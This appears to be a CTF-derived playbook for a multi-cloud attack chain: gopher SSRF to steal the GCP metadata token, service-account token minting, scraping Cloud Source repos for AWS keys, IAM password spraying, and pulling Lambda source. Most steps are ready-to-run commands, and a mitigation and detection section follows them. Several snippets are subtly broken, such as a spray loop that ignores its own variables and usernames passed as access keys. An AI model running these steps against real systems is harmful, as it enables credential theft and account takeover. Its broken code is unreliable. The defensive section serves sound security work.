# Multi-Cloud Lateral Movement — GCP SSRF → AWS Account Discovery → Console Spray

## Chain Summary
**Entry Point:** SSRF in GCP web application (gopher protocol injectable)  
**Severity:** Critical  
**Source:** https://kabinet.gitbook.io/ctf-writeup/2025/thuderdome/infiltrate-open-the-gate

Exploits SSRF in GCP application to steal metadata service token, performs service account token minting for elevated privileges, accesses GCP Cloud Source repos, discovers AWS S3 and account IDs, then performs credential spray against AWS console to gain account takeover and access Lambda source code.

---

## Chain: SSRF (Gopher) → GCP Metadata Token → SA Token Minting → Cloud Source Repo → AWS ID Discovery → Console Spray

### [1] SSRF Vulnerability & Gopher Protocol Exploitation
- **Trigger:** Target GCP web application has SSRF vulnerability in file fetch or URL proxy parameter; gopher:// protocol not blocked
- **Prereq:** Identified SSRF parameter (typically: file_url, url, fetch, import, proxy, etc.); ability to test with custom payloads
- **Method:**
  ```bash
  # Test basic SSRF (HTTP)
  curl "https://app.internal/api/fetch?url=http://127.0.0.1:8080"
  
  # Test gopher SSRF (often used to bypass URL validation)
  curl "https://app.internal/api/fetch?url=gopher://127.0.0.1:80/GET%20/%20HTTP/1.0"
  
  # Test file protocol
  curl "https://app.internal/api/fetch?url=file:///etc/passwd"
  
  # Identify response differences (blind SSRF indication)
  # Compare response size for valid vs. invalid gopher URLs
  ```
- **Yields:** Confirmation of SSRF vulnerability; ability to craft custom protocols

### [2] GCP Metadata Service Token Theft via SSRF
- **Trigger:** SSRF confirmed; Gopher protocol not filtered; metadata endpoint accessible
- **Prereq:** SSRF vulnerable endpoint; gopher protocol support; internal network access to 169.254.169.254
- **Method:**
  ```bash
  # Craft gopher payload to query GCP metadata service
  # Gopher protocol allows sending raw HTTP requests
  
  # Request: GET /computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1
  GOPHER_PAYLOAD="gopher://169.254.169.254:80/GET%20/computeMetadata/v1/instance/service-accounts/default/token?scopes=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcloud-platform%20HTTP/1.1%0AMetadata-Flavor%3A%20Google%0AConnection%3A%20close%0A%0A"
  
  # URL-encode and send via SSRF
  curl "https://app.internal/api/fetch?url=$GOPHER_PAYLOAD" > metadata_response.txt
  
  # Extract token from response (base64 encoded in gopher response)
  # Parse the HTTP response body to get JSON token
  grep -oP '"access_token"\s*:\s*"\K[^"]+' metadata_response.txt
  ```
- **Yields:** GCP service account access token (valid for 1 hour) with `cloud-platform` scope

### [3] Service Account Token Minting (Obtain Higher-Privilege Token)
- **Trigger:** Base metadata token obtained; need to elevate to service account with higher permissions
- **Prereq:** Metadata token; ability to mint tokens for other service accounts; knowledge of service account names
- **Method:**
  ```bash
  # Step 1: Discover available service accounts (via Cloud IAM or metadata)
  # Using the metadata token to query IAM API
  TOKEN=$(grep -oP '"access_token"\s*:\s*"\K[^"]+' metadata_response.txt)
  
  curl -s -H "Authorization: Bearer $TOKEN" \
    "https://iam.googleapis.com/v1/projects/-/serviceAccounts" \
    | jq '.accounts[] | {email, displayName}'
  
  # Step 2: Request token for a higher-privilege service account
  # If the current token allows serviceAccounts.actAs, mint a token for another SA
  SA_EMAIL="<high-privilege-sa@project.iam.gserviceaccount.com>"
  
  curl -s -X POST \
    -H "Authorization: Bearer $TOKEN" \
    "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA_EMAIL:generateAccessToken" \
    -d '{
      "scope": ["https://www.googleapis.com/auth/cloud-platform"]
    }' | jq -r '.accessToken'
  
  # Or, request ID token (JWT) for app access
  curl -s -X POST \
    -H "Authorization: Bearer $TOKEN" \
    "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA_EMAIL:generateIdToken" \
    -d '{"audience": "https://cloud-source-repositories.googleapis.com"}' \
    | jq -r '.identity'
  ```
- **Yields:** Elevated access token with broader IAM permissions; ID token for service-to-service auth

### [4] GCP Cloud Source Repository Access & Discovery
- **Trigger:** Elevated token obtained; need to find AWS credentials or IAM data in code repositories
- **Prereq:** Cloud Source Repositories enabled in project; access token with source repo read permissions; code likely contains AWS keys or config
- **Method:**
  ```bash
  # List Cloud Source repositories
  curl -s -H "Authorization: Bearer $TOKEN" \
    "https://source.googleapis.com/v1/projects" | jq .
  
  # Clone repository (or browse via API)
  REPO_NAME="app-config"
  
  # Via git+curl (using token)
  git clone https://source.developers.google.com/p/project-id/r/$REPO_NAME
  
  # Or download via API
  curl -s -H "Authorization: Bearer $TOKEN" \
    "https://source.googleapis.com/v1/projects/project-id/repos/$REPO_NAME/fileContents/file.txt"
  
  # Search for AWS credentials in repo
  grep -r "AKIA\|AWS_SECRET\|AWS_ACCESS_KEY\|aws_access_key_id" ./repo/ 2>/dev/null
  
  # Or query large files (lambdas, configs, env exports)
  find ./repo -name "*.env*" -o -name "*config*" -o -name "*.yml" -o -name "*.json" | xargs grep -l "aws\|AKIA"
  ```
- **Yields:** AWS credentials (access keys) embedded in source code or configuration files; AWS account IDs in comments or config

### [5] AWS S3 Bucket & Account ID Discovery
- **Trigger:** AWS access keys obtained; need to confirm account and discover flag location
- **Prereq:** AWS CLI installed and configured with extracted access keys; S3 bucket names known or enumerable
- **Method:**
  ```bash
  # Configure AWS CLI with extracted credentials
  export AWS_ACCESS_KEY_ID="<extracted_key>"
  export AWS_SECRET_ACCESS_KEY="<extracted_secret>"
  
  # Verify identity and discover account ID
  aws sts get-caller-identity
  # Returns: Account ID, UserId, ARN
  
  # List S3 buckets
  aws s3 ls | grep -E "flag|secret|data|backup|export"
  
  # Check for bucket with flag
  aws s3 ls s3://flag-bucket/ --recursive
  
  # Or enumerate S3 with alternative keys (if extracted key has limited access)
  aws sts get-account-summary | jq .
  ```
- **Yields:** AWS account ID; confirmation of valid credentials; S3 bucket listing with flag/sensitive data

### [6] AWS Console Spray (Using Extracted Credentials or IAM User Enumeration)
- **Trigger:** AWS account ID obtained; may have multiple IAM users with weak passwords; need console access
- **Prereq:** AWS account ID; list of likely usernames (extracted from code, email lists, org structure); password wordlist
- **Method:**
  ```bash
  # Approach 1: Direct console login (if credentials allow)
  # Use AWS CLI to test user credentials
  for access_key in $(cat extracted_keys.txt); do
    for secret_key in $(cat extracted_secrets.txt); do
      response=$(aws sts get-caller-identity --region us-east-1 2>&1)
      if echo "$response" | jq -e '.Account' >/dev/null 2>&1; then
        echo "[+] VALID: $access_key:$secret_key"
      fi
    done
  done
  
  # Approach 2: IAM user enumeration + password spray
  # First, enumerate IAM users (if permissions allow)
  aws iam list-users --query 'Users[*].UserName' --output text
  
  # Spray common passwords against found users
  for user in $(aws iam list-users --query 'Users[*].UserName' --output text); do
    for pass in $(cat passwords.txt); do
      # Attempt console login (via boto3 or selenium)
      python3 <<EOF
  import boto3
  try:
    client = boto3.client('iam', aws_access_key_id='$user', aws_secret_access_key='$pass')
    client.get_user()
    print(f"[+] VALID: $user:$pass")
  except:
    pass
  EOF
    done
  done
  
  # Approach 3: testAssumeRole (if role assumption is permissible)
  aws sts assume-role --role-arn "arn:aws:iam::<ACCOUNT>:role/<ROLE_NAME>" \
    --role-session-name "attacker-session"
  ```
- **Yields:** Valid AWS IAM credentials; console access; temporary credentials for role assumption

### [7] Lambda Source Code & Flag Access
- **Trigger:** AWS console access obtained; need to extract Lambda functions containing flag or flag location
- **Prereq:** AWS credentials with Lambda read access; Lambda function names known or enumerable
- **Method:**
  ```bash
  # List Lambda functions
  aws lambda list-functions --region us-east-1 \
    --query 'Functions[*].[FunctionName, Handler, Runtime]' --output table
  
  # Download Lambda function code
  FUNCTION_NAME="flag_handler"
  aws lambda get-function --function-name $FUNCTION_NAME --region us-east-1 \
    > function_info.json
  
  # Extract download URL
  CODE_URL=$(jq -r '.Code.RepositoryType, .Code.Location' function_info.json)
  
  # Download and extract
  wget "$CODE_URL" -O function.zip
  unzip function.zip
  
  # Search for flag or sensitive data in source
  grep -r "FLAG\|flag\|password\|secret\|key" . --include="*.py" --include="*.js" --include="*.json"
  
  # Or check environment variables
  aws lambda get-function-configuration --function-name $FUNCTION_NAME \
    --query 'Environment.Variables' --output json
  ```
- **Yields:** Lambda source code; environment variables containing flag or credentials; direct flag access

---

## Mitigation & Detection

**Prevention:**
- **SSRF Mitigation:**
  - Whitelist allowed URL schemes (http, https only); block gopher, file, ftp, tftp
  - Use private network isolation; restrict metadata endpoint access via firewall rules
  - Implement egress filtering; deny outbound connections to 169.254.0.0/16 (metadata ranges)
- **Service Account Security:**
  - Disable unnecessary service account permissions; use Workload Identity Federation instead of long-lived keys
  - Restrict `iamcredentials.actAs` to specific service accounts
  - Regularly audit service account usage and permissions
- **Code Repository Security:**
  - Scan source code for secrets (use GitGuardian, Snyk, or similar)
  - Never commit AWS keys, GCP keys, passwords to repositories
  - Use branch protection + mandatory code review
- **AWS Console & IAM:**
  - Enforce MFA on all IAM users; no exceptions
  - Use temporary credentials via STS; disable long-lived access keys for humans
  - Implement Conditional Access policies for console login
  - Restrict cross-cloud credential storage (don't embed AWS keys in GCP systems)
- **Lambda Security:**
  - Use IAM roles instead of environment variables for credentials
  - Restrict Lambda execution roles to necessary permissions only
  - Enable Lambda VPC execution and restrict egress

**Detection:**
- **GCP Audit Logs:** Alert on:
  - `testIamPermissions` or `iamcredentials.generateAccessToken` calls
  - Metadata endpoint queries from non-standard processes
  - Cloud Source Repository clones by service accounts
- **Network IDS/WAF:** Detect gopher protocol usage, SSRF payloads, metadata endpoint access
- **AWS CloudTrail:** Monitor for:
  - Unusual IAM user creation or access key generation
  - Lambda function downloads or list operations
  - Cross-service API calls (GCP-originated requests)
  - Failed login attempts followed by success (spray pattern)
- **AWS IAM Access Analyzer:** Alert on roles with cross-cloud or unusual trust relationships

---

## References
- SSRF Exploitation: https://owasp.org/www-community/attacks/Server-side_Request_Forgery
- GCP Metadata Service Security: https://cloud.google.com/docs/authentication/best-practices-mtls#metadata-server
- AWS IAM Best Practices: https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html
- Lambda Security: https://docs.aws.amazon.com/lambda/latest/dg/access-control-resource-based.html
- Workload Identity Federation: https://cloud.google.com/docs/authentication/workload-identity-federation
